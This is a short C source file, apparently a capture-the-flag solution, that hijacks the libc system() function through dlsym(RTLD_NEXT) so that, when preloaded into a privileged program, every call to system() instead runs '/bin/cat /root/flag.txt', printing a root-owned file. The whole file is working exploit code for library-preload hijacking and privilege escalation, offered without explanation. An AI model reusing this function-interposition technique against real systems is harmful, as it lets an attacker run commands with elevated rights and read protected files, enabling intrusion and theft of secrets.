#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <stdarg.h>
int system(const char *command){

	int (*original_system)(const char*);
	original_system = dlsym(RTLD_NEXT, "system");


	original_system("/bin/cat /root/flag.txt");


	int res = original_system("/bin/cat /root/flag.txt");

	return res;
}
